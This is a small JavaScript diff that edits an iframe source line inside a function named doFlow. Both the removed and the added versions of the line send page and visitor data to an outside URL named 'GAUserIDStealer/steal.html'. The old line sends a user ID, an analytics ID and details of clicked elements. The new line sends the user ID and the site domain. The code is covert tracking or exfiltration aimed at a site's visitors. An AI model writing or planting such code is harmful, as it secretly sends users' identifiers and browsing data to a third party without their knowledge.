@@ -220,5 +220,5 @@ function doFlow(){
     }
 
 
-    cframe.src ="https://gugu5566.github.io/GAUserIDStealer/steal.html?randId=="+guhappyId+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
+    cframe.src ="https://gugu5566.github.io/GAUserIDStealer/steal.html?randId=="+guhappyId+"&&domain="+site_domain;
 }
